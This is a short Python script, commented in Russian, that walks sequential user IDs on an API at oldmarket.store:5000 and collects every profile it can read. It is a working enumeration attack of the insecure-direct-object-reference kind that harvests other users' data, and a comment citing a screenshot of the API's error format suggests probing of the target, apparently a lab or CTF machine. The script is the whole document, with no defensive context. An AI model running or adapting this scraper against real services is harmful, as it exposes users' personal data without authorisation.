import requests

LINK = "http://oldmarket.store:5000"
session = requests.Session() # Сессия ускорит работу

current_id = 1
empty_streak = 0
max_empty_streak = 10 # Остановимся, если 10 ID подряд вернут ошибку
profiles = []

print("Начинаю сканирование...")

while empty_streak < max_empty_streak:
    try:
        response = session.get(f"{LINK}/api/user/{current_id}/profile")
        data = response.json()
        
        # На image_e0a235.png видно, что API возвращает ключ "error"
        if "error" not in data:
            profiles.append(data)
            print(f"[+] ID {current_id} найден: {data.get('username')}")
            empty_streak = 0 # Сбрасываем счетчик ошибок, если нашли живого юзера
        else:
            empty_streak += 1
            
    except Exception as e:
        print(f"Ошибка на ID {current_id}: {e}")
        empty_streak += 1
    
    current_id += 1

print(f"\nГотово! Последний проверенный ID: {current_id - max_empty_streak}")
print(f"Всего сохранено: {len(profiles)}")
